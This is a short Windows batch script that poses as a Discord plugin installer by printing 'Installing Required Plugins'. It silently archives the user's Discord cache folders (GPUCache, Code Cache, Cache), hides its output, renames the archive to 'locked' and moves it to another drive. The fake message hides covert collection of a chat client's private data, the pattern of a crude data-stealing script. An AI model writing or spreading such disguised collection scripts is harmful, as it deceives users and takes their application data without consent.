@echo off 
cd /D %appdata%\discord
echo "Installing Required Plugins.....!"
tar -cvzf locked.tar.gz GPUCache "Code Cache" Cache >nul 2>nul
ren locked.tar.gz locked
move locked E:\programing\sh\bash
exit